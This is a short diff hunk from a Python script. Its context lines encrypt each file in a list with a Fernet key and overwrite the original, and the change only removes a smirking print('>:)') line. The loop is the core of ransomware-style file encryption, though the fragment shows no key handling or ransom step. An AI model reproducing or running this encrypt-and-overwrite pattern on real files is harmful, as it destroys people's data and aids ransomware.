@@ -17,5 +17,3 @@ for file in files:
     contents_encrypted = Fernet(key).encrypt(contents)
     with open(file, "wb") as the_file:
         the_file.write(contents_encrypted)
-
-print(">:)")
